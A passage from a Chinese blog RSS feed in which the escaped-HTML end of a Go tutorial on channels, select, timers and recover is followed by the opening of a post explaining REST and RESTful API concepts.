-&lt;span class=&quot;kw&quot;&gt;var&lt;/span&gt; a &lt;span class=&quot;dt&quot;&gt;int&lt;/span&gt;  = &lt;span class=&quot;dv&quot;&gt;10&lt;/span&gt;
-testChan &amp;lt;- a&lt;/code&gt;
-&lt;/pre&gt;&lt;/div&gt;
-&lt;h2 id=&quot;goroutine和channel相结合&quot;&gt;goroutine和channel相结合&lt;/h2&gt;
-&lt;div class=&quot;sourceCode&quot; readability=&quot;12&quot;&gt;
-&lt;pre class=&quot;sourceCode go&quot;&gt;
-&lt;code class=&quot;sourceCode go&quot;&gt;&lt;span class=&quot;kw&quot;&gt;package&lt;/span&gt; main
-
-&lt;span class=&quot;kw&quot;&gt;import&lt;/span&gt; (
-   &lt;span class=&quot;st&quot;&gt;&quot;fmt&quot;&lt;/span&gt;
-   &lt;span class=&quot;st&quot;&gt;&quot;time&quot;&lt;/span&gt;
-)
-
-&lt;span class=&quot;kw&quot;&gt;func&lt;/span&gt; write(ch &lt;span class=&quot;kw&quot;&gt;chan&lt;/span&gt; &lt;span class=&quot;dt&quot;&gt;int&lt;/span&gt;) {
-   &lt;span class=&quot;kw&quot;&gt;for&lt;/span&gt; i := &lt;span class=&quot;dv&quot;&gt;0&lt;/span&gt;; i &amp;lt; &lt;span class=&quot;dv&quot;&gt;100&lt;/span&gt;; i++ {
-      ch &amp;lt;- i
-      fmt.Println(&lt;span class=&quot;st&quot;&gt;&quot;put data:&quot;&lt;/span&gt;, i)
-   }
-}
-
-&lt;span class=&quot;kw&quot;&gt;func&lt;/span&gt; read(ch &lt;span class=&quot;kw&quot;&gt;chan&lt;/span&gt; &lt;span class=&quot;dt&quot;&gt;int&lt;/span&gt;) {
-   &lt;span class=&quot;kw&quot;&gt;for&lt;/span&gt; {
-      &lt;span class=&quot;kw&quot;&gt;var&lt;/span&gt; b &lt;span class=&quot;dt&quot;&gt;int&lt;/span&gt;
-      b = &amp;lt;-ch
-      fmt.Println(b)
-      time.Sleep(time.Second)
-   }
-}
-
-&lt;span class=&quot;kw&quot;&gt;func&lt;/span&gt; main() {
-   intChan := &lt;span class=&quot;fu&quot;&gt;make&lt;/span&gt;(&lt;span class=&quot;kw&quot;&gt;chan&lt;/span&gt; &lt;span class=&quot;dt&quot;&gt;int&lt;/span&gt;, &lt;span class=&quot;dv&quot;&gt;10&lt;/span&gt;) &lt;span class=&quot;co&quot;&gt;//testChan是带缓冲区的chan，一次可以放10个元素&lt;/span&gt;
-   &lt;span class=&quot;kw&quot;&gt;go&lt;/span&gt; write(intChan)
-   &lt;span class=&quot;kw&quot;&gt;go&lt;/span&gt; read(intChan)&lt;span class=&quot;co&quot;&gt;//不读的话会引发阻塞&lt;/span&gt;
-   time.Sleep(&lt;span class=&quot;dv&quot;&gt;10&lt;/span&gt; * time.Second)
-}&lt;/code&gt;
-&lt;/pre&gt;&lt;/div&gt;
-&lt;h2 id=&quot;chan之间的同步&quot;&gt;chan之间的同步&lt;/h2&gt;
-&lt;div class=&quot;sourceCode&quot; readability=&quot;17&quot;&gt;
-&lt;pre class=&quot;sourceCode go&quot;&gt;
-&lt;code class=&quot;sourceCode go&quot;&gt;&lt;span class=&quot;kw&quot;&gt;package&lt;/span&gt; main
-
-&lt;span class=&quot;kw&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;&quot;fmt&quot;&lt;/span&gt;
-
-&lt;span class=&quot;kw&quot;&gt;func&lt;/span&gt; send(ch &lt;span class=&quot;kw&quot;&gt;chan&lt;/span&gt; &lt;span class=&quot;dt&quot;&gt;int&lt;/span&gt;, exitChan &lt;span class=&quot;kw&quot;&gt;chan&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;struct&lt;/span&gt;{}) {
-    &lt;span class=&quot;kw&quot;&gt;for&lt;/span&gt; i := &lt;span class=&quot;dv&quot;&gt;0&lt;/span&gt;; i &amp;lt; &lt;span class=&quot;dv&quot;&gt;10&lt;/span&gt;; i++ {
-        ch &amp;lt;- i
-    }
-    &lt;span class=&quot;fu&quot;&gt;close&lt;/span&gt;(ch)
-    &lt;span class=&quot;kw&quot;&gt;var&lt;/span&gt; a &lt;span class=&quot;kw&quot;&gt;struct&lt;/span&gt;{}
-    exitChan &amp;lt;- a
-}
-
-&lt;span class=&quot;kw&quot;&gt;func&lt;/span&gt; recv(ch &lt;span class=&quot;kw&quot;&gt;chan&lt;/span&gt; &lt;span class=&quot;dt&quot;&gt;int&lt;/span&gt;, exitChan &lt;span class=&quot;kw&quot;&gt;chan&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;struct&lt;/span&gt;{}) {
-    &lt;span class=&quot;kw&quot;&gt;for&lt;/span&gt; {
-        v, ok := &amp;lt;-ch
-        &lt;span class=&quot;kw&quot;&gt;if&lt;/span&gt; !ok {
-            &lt;span class=&quot;kw&quot;&gt;break&lt;/span&gt;
-        }
-        fmt.Println(v)
-    }
-    &lt;span class=&quot;kw&quot;&gt;var&lt;/span&gt; a &lt;span class=&quot;kw&quot;&gt;struct&lt;/span&gt;{}
-    exitChan &amp;lt;- a
-}
-
-&lt;span class=&quot;kw&quot;&gt;func&lt;/span&gt; main() {
-    &lt;span class=&quot;kw&quot;&gt;var&lt;/span&gt; ch &lt;span class=&quot;kw&quot;&gt;chan&lt;/span&gt; &lt;span class=&quot;dt&quot;&gt;int&lt;/span&gt;
-    ch = &lt;span class=&quot;fu&quot;&gt;make&lt;/span&gt;(&lt;span class=&quot;kw&quot;&gt;chan&lt;/span&gt; &lt;span class=&quot;dt&quot;&gt;int&lt;/span&gt;, &lt;span class=&quot;dv&quot;&gt;10&lt;/span&gt;)
-    exitChan := &lt;span class=&quot;fu&quot;&gt;make&lt;/span&gt;(&lt;span class=&quot;kw&quot;&gt;chan&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;struct&lt;/span&gt;{}, &lt;span class=&quot;dv&quot;&gt;2&lt;/span&gt;)
-
-    &lt;span class=&quot;kw&quot;&gt;go&lt;/span&gt; send(ch, exitChan)
-    &lt;span class=&quot;kw&quot;&gt;go&lt;/span&gt; recv(ch, exitChan)
-
-    &lt;span class=&quot;kw&quot;&gt;var&lt;/span&gt; total = &lt;span class=&quot;dv&quot;&gt;0&lt;/span&gt;
-    &lt;span class=&quot;kw&quot;&gt;for&lt;/span&gt; _ = &lt;span class=&quot;kw&quot;&gt;range&lt;/span&gt; exitChan {
-        total++
-        &lt;span class=&quot;kw&quot;&gt;if&lt;/span&gt; total == &lt;span class=&quot;dv&quot;&gt;2&lt;/span&gt; {
-            &lt;span class=&quot;kw&quot;&gt;break&lt;/span&gt;
-        }
-    }
-}&lt;/code&gt;
-&lt;/pre&gt;&lt;/div&gt;
-&lt;p&gt;例子：&lt;/p&gt;
-&lt;div class=&quot;sourceCode&quot; readability=&quot;19&quot;&gt;
-&lt;pre class=&quot;sourceCode go&quot;&gt;
-&lt;code class=&quot;sourceCode go&quot;&gt;&lt;span class=&quot;kw&quot;&gt;package&lt;/span&gt; main
-
-&lt;span class=&quot;kw&quot;&gt;import&lt;/span&gt; (
-   &lt;span class=&quot;st&quot;&gt;&quot;fmt&quot;&lt;/span&gt;
-)
-&lt;span class=&quot;co&quot;&gt;//计算1000以内的素数&lt;/span&gt;
-&lt;span class=&quot;kw&quot;&gt;func&lt;/span&gt; calc(taskChan &lt;span class=&quot;kw&quot;&gt;chan&lt;/span&gt; &lt;span class=&quot;dt&quot;&gt;int&lt;/span&gt;, resChan &lt;span class=&quot;kw&quot;&gt;chan&lt;/span&gt; &lt;span class=&quot;dt&quot;&gt;int&lt;/span&gt;, exitChan &lt;span class=&quot;kw&quot;&gt;chan&lt;/span&gt; &lt;span class=&quot;dt&quot;&gt;bool&lt;/span&gt;) {
-   &lt;span class=&quot;kw&quot;&gt;for&lt;/span&gt; v := &lt;span class=&quot;kw&quot;&gt;range&lt;/span&gt; taskChan {
-      flag := &lt;span class=&quot;ot&quot;&gt;true&lt;/span&gt;
-      &lt;span class=&quot;kw&quot;&gt;for&lt;/span&gt; i := &lt;span class=&quot;dv&quot;&gt;2&lt;/span&gt;; i &amp;lt; v; i++ {
-         &lt;span class=&quot;kw&quot;&gt;if&lt;/span&gt; v%i == &lt;span class=&quot;dv&quot;&gt;0&lt;/span&gt; {
-            flag = &lt;span class=&quot;ot&quot;&gt;false&lt;/span&gt;
-            &lt;span class=&quot;kw&quot;&gt;break&lt;/span&gt;
-         }
-      }
-      &lt;span class=&quot;kw&quot;&gt;if&lt;/span&gt; flag {
-         resChan &amp;lt;- v
-      }
-   }
-   fmt.Println(&lt;span class=&quot;st&quot;&gt;&quot;exit&quot;&lt;/span&gt;)
-   exitChan &amp;lt;- &lt;span class=&quot;ot&quot;&gt;true&lt;/span&gt;
-}
-
-&lt;span class=&quot;kw&quot;&gt;func&lt;/span&gt; main() {
-   intChan := &lt;span class=&quot;fu&quot;&gt;make&lt;/span&gt;(&lt;span class=&quot;kw&quot;&gt;chan&lt;/span&gt; &lt;span class=&quot;dt&quot;&gt;int&lt;/span&gt;, &lt;span class=&quot;dv&quot;&gt;100&lt;/span&gt;)
-   resultChan := &lt;span class=&quot;fu&quot;&gt;make&lt;/span&gt;(&lt;span class=&quot;kw&quot;&gt;chan&lt;/span&gt; &lt;span class=&quot;dt&quot;&gt;int&lt;/span&gt;, &lt;span class=&quot;dv&quot;&gt;100&lt;/span&gt;)
-   exitChan := &lt;span class=&quot;fu&quot;&gt;make&lt;/span&gt;(&lt;span class=&quot;kw&quot;&gt;chan&lt;/span&gt; &lt;span class=&quot;dt&quot;&gt;bool&lt;/span&gt;, &lt;span class=&quot;dv&quot;&gt;8&lt;/span&gt;)
-
-   &lt;span class=&quot;kw&quot;&gt;go&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;func&lt;/span&gt;() {
-      &lt;span class=&quot;kw&quot;&gt;for&lt;/span&gt; i := &lt;span class=&quot;dv&quot;&gt;0&lt;/span&gt;; i &amp;lt; &lt;span class=&quot;dv&quot;&gt;1000&lt;/span&gt;; i++ {
-         intChan &amp;lt;- i
-      }
-      &lt;span class=&quot;fu&quot;&gt;close&lt;/span&gt;(intChan)
-   }()
-
-   &lt;span class=&quot;kw&quot;&gt;for&lt;/span&gt; i := &lt;span class=&quot;dv&quot;&gt;0&lt;/span&gt;; i &amp;lt; &lt;span class=&quot;dv&quot;&gt;8&lt;/span&gt;; i++ {
-      &lt;span class=&quot;kw&quot;&gt;go&lt;/span&gt; calc(intChan, resultChan, exitChan)
-   }
-
-   &lt;span class=&quot;co&quot;&gt;//等待所有计算的goroutine全部退出&lt;/span&gt;
-   &lt;span class=&quot;kw&quot;&gt;go&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;func&lt;/span&gt;() {
-      &lt;span class=&quot;kw&quot;&gt;for&lt;/span&gt; i := &lt;span class=&quot;dv&quot;&gt;0&lt;/span&gt;; i &amp;lt; &lt;span class=&quot;dv&quot;&gt;8&lt;/span&gt;; i++ {
-         &amp;lt;-exitChan
-         fmt.Println(&lt;span class=&quot;st&quot;&gt;&quot;wait goroute &quot;&lt;/span&gt;, i, &lt;span class=&quot;st&quot;&gt;&quot; exited&quot;&lt;/span&gt;)
-      }
-      &lt;span class=&quot;fu&quot;&gt;close&lt;/span&gt;(resultChan)
-   }()
-
-   &lt;span class=&quot;kw&quot;&gt;for&lt;/span&gt; v := &lt;span class=&quot;kw&quot;&gt;range&lt;/span&gt; resultChan {
-      &lt;span class=&quot;co&quot;&gt;//fmt.Println(v)&lt;/span&gt;
-      _ = v
-   }
-}&lt;/code&gt;
-&lt;/pre&gt;&lt;/div&gt;
-&lt;h2 id=&quot;chan的关闭&quot;&gt;chan的关闭&lt;/h2&gt;
-&lt;p&gt;1.使用内置函数close进行关闭，chan关闭之后，for range遍历chan中已经存在的元素后结束&lt;/p&gt;
-&lt;p&gt;2.使用内置函数close进行关闭，chan关闭之后，没有使用for range的写法需要使用，v, ok := &amp;lt;- ch进行判断chan是否关闭&lt;/p&gt;
-&lt;div class=&quot;sourceCode&quot; readability=&quot;11&quot;&gt;
-&lt;pre class=&quot;sourceCode go&quot;&gt;
-&lt;code class=&quot;sourceCode go&quot;&gt;&lt;span class=&quot;kw&quot;&gt;package&lt;/span&gt; main
-
-&lt;span class=&quot;kw&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;&quot;fmt&quot;&lt;/span&gt;
-
-&lt;span class=&quot;kw&quot;&gt;func&lt;/span&gt; main() {
-   &lt;span class=&quot;kw&quot;&gt;var&lt;/span&gt; ch &lt;span class=&quot;kw&quot;&gt;chan&lt;/span&gt; &lt;span class=&quot;dt&quot;&gt;int&lt;/span&gt;
-   ch = &lt;span class=&quot;fu&quot;&gt;make&lt;/span&gt;(&lt;span class=&quot;kw&quot;&gt;chan&lt;/span&gt; &lt;span class=&quot;dt&quot;&gt;int&lt;/span&gt;, &lt;span class=&quot;dv&quot;&gt;10&lt;/span&gt;)
-   &lt;span class=&quot;kw&quot;&gt;for&lt;/span&gt; i := &lt;span class=&quot;dv&quot;&gt;0&lt;/span&gt;; i &amp;lt; &lt;span class=&quot;dv&quot;&gt;10&lt;/span&gt;; i++ {
-      ch &amp;lt;- i
-   }
-
-   &lt;span class=&quot;fu&quot;&gt;close&lt;/span&gt;(ch)
-   &lt;span class=&quot;kw&quot;&gt;for&lt;/span&gt; {
-      &lt;span class=&quot;kw&quot;&gt;var&lt;/span&gt; b &lt;span class=&quot;dt&quot;&gt;int&lt;/span&gt;
-      b,ok := &amp;lt;-ch
-      &lt;span class=&quot;kw&quot;&gt;if&lt;/span&gt; ok == &lt;span class=&quot;ot&quot;&gt;false&lt;/span&gt; {
-         fmt.Println(&lt;span class=&quot;st&quot;&gt;&quot;chan is close&quot;&lt;/span&gt;)
-         &lt;span class=&quot;kw&quot;&gt;break&lt;/span&gt;
-      }
-      fmt.Println(b) &lt;span class=&quot;co&quot;&gt;//谨防死循环&lt;/span&gt;
-   }
-}&lt;/code&gt;
-&lt;/pre&gt;&lt;/div&gt;
-&lt;h2 id=&quot;for-range遍历chan&quot;&gt;for range遍历chan&lt;/h2&gt;
-&lt;div class=&quot;sourceCode&quot; readability=&quot;9&quot;&gt;
-&lt;pre class=&quot;sourceCode go&quot;&gt;
-&lt;code class=&quot;sourceCode go&quot;&gt;&lt;span class=&quot;kw&quot;&gt;package&lt;/span&gt; main
-
-&lt;span class=&quot;kw&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;&quot;fmt&quot;&lt;/span&gt;
-
-&lt;span class=&quot;kw&quot;&gt;func&lt;/span&gt; main() {
-   &lt;span class=&quot;kw&quot;&gt;var&lt;/span&gt; ch &lt;span class=&quot;kw&quot;&gt;chan&lt;/span&gt; &lt;span class=&quot;dt&quot;&gt;int&lt;/span&gt;
-   ch = &lt;span class=&quot;fu&quot;&gt;make&lt;/span&gt;(&lt;span class=&quot;kw&quot;&gt;chan&lt;/span&gt; &lt;span class=&quot;dt&quot;&gt;int&lt;/span&gt;, &lt;span class=&quot;dv&quot;&gt;1000&lt;/span&gt;)
-   &lt;span class=&quot;kw&quot;&gt;for&lt;/span&gt; i := &lt;span class=&quot;dv&quot;&gt;0&lt;/span&gt;; i &amp;lt; &lt;span class=&quot;dv&quot;&gt;1000&lt;/span&gt;; i++ {
-      ch &amp;lt;- i
-   }
-
-   &lt;span class=&quot;fu&quot;&gt;close&lt;/span&gt;(ch)
-   &lt;span class=&quot;kw&quot;&gt;for&lt;/span&gt; v := &lt;span class=&quot;kw&quot;&gt;range&lt;/span&gt; ch {
-      fmt.Println(v)
-   }
-}&lt;/code&gt;
-&lt;/pre&gt;&lt;/div&gt;
-&lt;h2 id=&quot;chan的只读和只写&quot;&gt;chan的只读和只写&lt;/h2&gt;
-&lt;p&gt;a. 只读chan的声明&lt;/p&gt;
-&lt;pre&gt;
-&lt;code&gt;Var 变量的名字 &amp;lt;-chan int
-Var readChan &amp;lt;- chan int&lt;/code&gt;
-&lt;/pre&gt;
-&lt;p&gt;b. 只写chan的声明&lt;/p&gt;
-&lt;pre&gt;
-&lt;code&gt;Var 变量的名字 chan&amp;lt;- int
-Var writeChan chan&amp;lt;- int&lt;/code&gt;
-&lt;/pre&gt;
-&lt;h2 id=&quot;对chan进行select操作&quot;&gt;对chan进行select操作&lt;/h2&gt;
-&lt;div class=&quot;sourceCode&quot; readability=&quot;7&quot;&gt;
-&lt;pre class=&quot;sourceCode go&quot;&gt;
-&lt;code class=&quot;sourceCode go&quot;&gt;&lt;span class=&quot;kw&quot;&gt;select&lt;/span&gt; {
-     &lt;span class=&quot;kw&quot;&gt;case&lt;/span&gt; u := &amp;lt;- ch1:
-     &lt;span class=&quot;kw&quot;&gt;case&lt;/span&gt; e := &amp;lt;- ch2:
-     &lt;span class=&quot;kw&quot;&gt;default&lt;/span&gt;:   
-  }&lt;/code&gt;
-&lt;/pre&gt;&lt;/div&gt;
-&lt;p&gt;下面是死锁了，阻塞了&lt;/p&gt;
-&lt;div class=&quot;sourceCode&quot; readability=&quot;9&quot;&gt;
-&lt;pre class=&quot;sourceCode go&quot;&gt;
-&lt;code class=&quot;sourceCode go&quot;&gt;&lt;span class=&quot;kw&quot;&gt;package&lt;/span&gt; main
-
-&lt;span class=&quot;kw&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;&quot;fmt&quot;&lt;/span&gt;
-
-&lt;span class=&quot;kw&quot;&gt;func&lt;/span&gt; main()  {
-   &lt;span class=&quot;kw&quot;&gt;var&lt;/span&gt; ch &lt;span class=&quot;kw&quot;&gt;chan&lt;/span&gt; &lt;span class=&quot;dt&quot;&gt;int&lt;/span&gt;
-   ch = &lt;span class=&quot;fu&quot;&gt;make&lt;/span&gt;(&lt;span class=&quot;kw&quot;&gt;chan&lt;/span&gt; &lt;span class=&quot;dt&quot;&gt;int&lt;/span&gt;,&lt;span class=&quot;dv&quot;&gt;10&lt;/span&gt;)
-   &lt;span class=&quot;kw&quot;&gt;for&lt;/span&gt; i :=&lt;span class=&quot;dv&quot;&gt;0&lt;/span&gt;;i&amp;lt;&lt;span class=&quot;dv&quot;&gt;10&lt;/span&gt;;i++{
-      ch &amp;lt;- i
-   }
-   &lt;span class=&quot;kw&quot;&gt;for&lt;/span&gt; {
-      &lt;span class=&quot;kw&quot;&gt;var&lt;/span&gt; b &lt;span class=&quot;dt&quot;&gt;int&lt;/span&gt;
-      b = &amp;lt;-ch
-      fmt.Println(b)
-   }
-}&lt;/code&gt;
-&lt;/pre&gt;&lt;/div&gt;
-&lt;p&gt;select解决阻塞&lt;/p&gt;
-&lt;div class=&quot;sourceCode&quot; readability=&quot;10&quot;&gt;
-&lt;pre class=&quot;sourceCode go&quot;&gt;
-&lt;code class=&quot;sourceCode go&quot;&gt;&lt;span class=&quot;co&quot;&gt;//@Time  : 2018/2/1 22:14&lt;/span&gt;
-&lt;span class=&quot;co&quot;&gt;//@Author: ningxin&lt;/span&gt;
-&lt;span class=&quot;kw&quot;&gt;package&lt;/span&gt; main
-
-&lt;span class=&quot;kw&quot;&gt;import&lt;/span&gt; (
-   &lt;span class=&quot;st&quot;&gt;&quot;fmt&quot;&lt;/span&gt;
-   &lt;span class=&quot;st&quot;&gt;&quot;time&quot;&lt;/span&gt;
-)
-
-&lt;span class=&quot;kw&quot;&gt;func&lt;/span&gt; main()  {
-   &lt;span class=&quot;kw&quot;&gt;var&lt;/span&gt; ch &lt;span class=&quot;kw&quot;&gt;chan&lt;/span&gt; &lt;span class=&quot;dt&quot;&gt;int&lt;/span&gt;
-   ch = &lt;span class=&quot;fu&quot;&gt;make&lt;/span&gt;(&lt;span class=&quot;kw&quot;&gt;chan&lt;/span&gt; &lt;span class=&quot;dt&quot;&gt;int&lt;/span&gt;,&lt;span class=&quot;dv&quot;&gt;10&lt;/span&gt;)
-   &lt;span class=&quot;kw&quot;&gt;for&lt;/span&gt; i :=&lt;span class=&quot;dv&quot;&gt;0&lt;/span&gt;;i&amp;lt;&lt;span class=&quot;dv&quot;&gt;10&lt;/span&gt;;i++{
-      ch &amp;lt;- i
-   }
-   &lt;span class=&quot;kw&quot;&gt;for&lt;/span&gt; {
-      &lt;span class=&quot;kw&quot;&gt;select&lt;/span&gt;{
-      &lt;span class=&quot;kw&quot;&gt;case&lt;/span&gt; v:= &amp;lt;-ch:
-         fmt.Println(v)
-      &lt;span class=&quot;kw&quot;&gt;default&lt;/span&gt;:
-         fmt.Println(&lt;span class=&quot;st&quot;&gt;&quot;get data timeout&quot;&lt;/span&gt;)
-         time.Sleep(time.Second)
-      }
-   }
-}&lt;/code&gt;
-&lt;/pre&gt;&lt;/div&gt;
-&lt;h2 id=&quot;定时器的使用&quot;&gt;定时器的使用&lt;/h2&gt;
-&lt;div class=&quot;sourceCode&quot; readability=&quot;10&quot;&gt;
-&lt;pre class=&quot;sourceCode go&quot;&gt;
-&lt;code class=&quot;sourceCode go&quot;&gt;&lt;span class=&quot;kw&quot;&gt;package&lt;/span&gt; main
-
-&lt;span class=&quot;kw&quot;&gt;import&lt;/span&gt; (
-    &lt;span class=&quot;st&quot;&gt;&quot;fmt&quot;&lt;/span&gt;
-    &lt;span class=&quot;st&quot;&gt;&quot;time&quot;&lt;/span&gt;
-)
-&lt;span class=&quot;kw&quot;&gt;func&lt;/span&gt; queryDb(ch &lt;span class=&quot;kw&quot;&gt;chan&lt;/span&gt; &lt;span class=&quot;dt&quot;&gt;int&lt;/span&gt;) {
-
-    time.Sleep(time.Second)
-    ch &amp;lt;- &lt;span class=&quot;dv&quot;&gt;100&lt;/span&gt;
-}
-&lt;span class=&quot;kw&quot;&gt;func&lt;/span&gt; main() {
-    ch := &lt;span class=&quot;fu&quot;&gt;make&lt;/span&gt;(&lt;span class=&quot;kw&quot;&gt;chan&lt;/span&gt; &lt;span class=&quot;dt&quot;&gt;int&lt;/span&gt;)
-    &lt;span class=&quot;kw&quot;&gt;go&lt;/span&gt; queryDb(ch)
-    t := time.NewTicker(time.Second)
-
-    &lt;span class=&quot;kw&quot;&gt;select&lt;/span&gt; {
-    &lt;span class=&quot;kw&quot;&gt;case&lt;/span&gt; v := &amp;lt;-ch:
-        fmt.Println(&lt;span class=&quot;st&quot;&gt;&quot;result&quot;&lt;/span&gt;, v)
-    &lt;span class=&quot;kw&quot;&gt;case&lt;/span&gt; &amp;lt;-t.C:
-        fmt.Println(&lt;span class=&quot;st&quot;&gt;&quot;timeout&quot;&lt;/span&gt;)
-    }
-}&lt;/code&gt;
-&lt;/pre&gt;&lt;/div&gt;
-&lt;p&gt;超时控制&lt;/p&gt;
-&lt;div class=&quot;sourceCode&quot; readability=&quot;9&quot;&gt;
-&lt;pre class=&quot;sourceCode go&quot;&gt;
-&lt;code class=&quot;sourceCode go&quot;&gt;&lt;span class=&quot;kw&quot;&gt;package&lt;/span&gt; main
-
-&lt;span class=&quot;kw&quot;&gt;import&lt;/span&gt; (
-   &lt;span class=&quot;st&quot;&gt;&quot;fmt&quot;&lt;/span&gt;
-   &lt;span class=&quot;st&quot;&gt;&quot;runtime&quot;&lt;/span&gt;
-   &lt;span class=&quot;st&quot;&gt;&quot;time&quot;&lt;/span&gt;
-)
-
-&lt;span class=&quot;kw&quot;&gt;func&lt;/span&gt; main() {
-   num := runtime.NumCPU()
-   runtime.GOMAXPROCS(num - &lt;span class=&quot;dv&quot;&gt;1&lt;/span&gt;)
-   &lt;span class=&quot;kw&quot;&gt;for&lt;/span&gt; i := &lt;span class=&quot;dv&quot;&gt;0&lt;/span&gt;; i &amp;lt; &lt;span class=&quot;dv&quot;&gt;16&lt;/span&gt;; i++ {
-      &lt;span class=&quot;kw&quot;&gt;go&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;func&lt;/span&gt;() {
-         &lt;span class=&quot;kw&quot;&gt;for&lt;/span&gt; {
-            t := time.NewTicker(time.Second)
-            &lt;span class=&quot;kw&quot;&gt;select&lt;/span&gt; {
-            &lt;span class=&quot;kw&quot;&gt;case&lt;/span&gt; &amp;lt;-t.C:
-               fmt.Println(&lt;span class=&quot;st&quot;&gt;&quot;timeout&quot;&lt;/span&gt;)
-            }
-            t.Stop()
-         }
-      }()
-   }
-
-   time.Sleep(time.Second * &lt;span class=&quot;dv&quot;&gt;100&lt;/span&gt;)
-}&lt;/code&gt;
-&lt;/pre&gt;&lt;/div&gt;
-&lt;h2 id=&quot;goroutine中使用recover&quot;&gt;goroutine中使用recover&lt;/h2&gt;
-&lt;p&gt;应用场景，如果某个goroutine panic了，而且这个goroutine里面没有捕获(recover)，那么整个进程就会挂掉。所以，好的习惯是每当go产生一个goroutine，就需要写下recover&lt;/p&gt;
-&lt;div class=&quot;sourceCode&quot; readability=&quot;11&quot;&gt;
-&lt;pre class=&quot;sourceCode go&quot;&gt;
-&lt;code class=&quot;sourceCode go&quot;&gt;&lt;span class=&quot;kw&quot;&gt;package&lt;/span&gt; main
-
-&lt;span class=&quot;kw&quot;&gt;import&lt;/span&gt; (
-   &lt;span class=&quot;st&quot;&gt;&quot;fmt&quot;&lt;/span&gt;
-   &lt;span class=&quot;st&quot;&gt;&quot;runtime&quot;&lt;/span&gt;
-   &lt;span class=&quot;st&quot;&gt;&quot;time&quot;&lt;/span&gt;
-)
-
-&lt;span class=&quot;kw&quot;&gt;func&lt;/span&gt; test() {
-   &lt;span class=&quot;kw&quot;&gt;defer&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;func&lt;/span&gt;() {
-      &lt;span class=&quot;kw&quot;&gt;if&lt;/span&gt; err := &lt;span class=&quot;fu&quot;&gt;recover&lt;/span&gt;(); err != &lt;span class=&quot;ot&quot;&gt;nil&lt;/span&gt; {
-         fmt.Println(&lt;span class=&quot;st&quot;&gt;&quot;panic:&quot;&lt;/span&gt;, err)
-      }
-   }()
-   &lt;span class=&quot;kw&quot;&gt;var&lt;/span&gt; m &lt;span class=&quot;kw&quot;&gt;map&lt;/span&gt;[&lt;span class=&quot;dt&quot;&gt;string&lt;/span&gt;]&lt;span class=&quot;dt&quot;&gt;int&lt;/span&gt;
-   m[&lt;span class=&quot;st&quot;&gt;&quot;stu&quot;&lt;/span&gt;] = &lt;span class=&quot;dv&quot;&gt;100&lt;/span&gt;
-}
-
-&lt;span class=&quot;kw&quot;&gt;func&lt;/span&gt; calc() {
-   &lt;span class=&quot;kw&quot;&gt;for&lt;/span&gt; {
-      fmt.Println(&lt;span class=&quot;st&quot;&gt;&quot;i'm calc&quot;&lt;/span&gt;)
-      time.Sleep(time.Second)
-   }
-}
-
-&lt;span class=&quot;kw&quot;&gt;func&lt;/span&gt; main() {
-   num := runtime.NumCPU()
-   runtime.GOMAXPROCS(num - &lt;span class=&quot;dv&quot;&gt;1&lt;/span&gt;)
-   &lt;span class=&quot;kw&quot;&gt;go&lt;/span&gt; test()
-   &lt;span class=&quot;kw&quot;&gt;for&lt;/span&gt; i := &lt;span class=&quot;dv&quot;&gt;0&lt;/span&gt;; i &amp;lt; &lt;span class=&quot;dv&quot;&gt;2&lt;/span&gt;; i++ {
-      &lt;span class=&quot;kw&quot;&gt;go&lt;/span&gt; calc()
-   }
-   time.Sleep(time.Second * &lt;span class=&quot;dv&quot;&gt;10000&lt;/span&gt;)
-}&lt;/code&gt;
-&lt;/pre&gt;&lt;/div&gt;
-</description>
-<pubDate>Wed, 14 Feb 2018 13:07:00 +0000</pubDate>
-<dc:creator>宁生信</dc:creator>
-<dc:language>zh-cn</dc:language>
-<dc:format>text/html</dc:format>
-<dc:identifier>http://www.cnblogs.com/gregoryli/p/8448903.html</dc:identifier>
-</item>
-<item>
-<title>RESTful API - 听风。</title>
-<link>http://www.cnblogs.com/huchong/p/8448639.html</link>
-<guid isPermaLink="true" >http://www.cnblogs.com/huchong/p/8448639.html</guid>
-<description>&lt;ul&gt;&lt;li&gt;REST与技术无关，代表的是一种软件架构风格，REST是Representational State Transfer的简称，中文翻译为“&lt;strong&gt;表征状态转移&lt;/strong&gt;”&lt;/li&gt;
-&lt;li&gt;REST从资源的角度类审视整个网络，它将分布在网络中某个节点的资源通过URL进行标识，客户端应用通过URL来获取资源的表征，获得这些表征致使这些应用转变状态&lt;/li&gt;
-&lt;li&gt;所有的数据，不管是通过网络获取的还是操作数据库获得（增删改查）的数据，都是资源，将一切数据视为资源是REST区别与其他架构风格的最本质属性&lt;/li&gt;
-&lt;li&gt;对于REST这种面向资源的架构风格，有人提出一种全新的结构理念，即：&lt;strong&gt;面向资源架构&lt;/strong&gt;（ROA：Resource Oriented Architecture）
-&lt;ul&gt;&lt;li&gt;对互联网上的任意东西都视为资源，他认为一个url就是一个资源 比如：http://www.xxx.com/get_user/&lt;/li&gt;
-&lt;/ul&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;1、什么是API？&lt;/p&gt;
-&lt;p&gt;答：API就是接口，提供的url。接口有两个用途：&lt;/p&gt;
-&lt;ul&gt;&lt;li&gt;- 为别人提供服务&lt;/li&gt;
-&lt;li&gt;- 前后端分离，一个写vue，一个写后端，他们之间都是通过ajax请求&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;网络应用程序，分为前端和后端两个部分。当前的发展趋势，就是前端设备层出不穷（手机、平板、桌面电脑、其他专用设备......）。&lt;/p&gt;
-&lt;p&gt;因此，必须有一种统一的机制，方便不同的前端设备与后端进行通信。这导致API构架的流行，甚至出现&lt;a href=&quot;http://www.google.com.hk/search?q=API+first&quot; target=&quot;_blank&quot;&gt;&quot;API First&quot;&lt;/a&gt;的设计思想。&lt;a href=&quot;http://en.wikipedia.org/wiki/Representational_state_transfer&quot; target=&quot;_blank&quot;&gt;RESTful API&lt;/a&gt;是目前比较成熟的一套互联网应用程序的API设计理论。&lt;/p&gt;
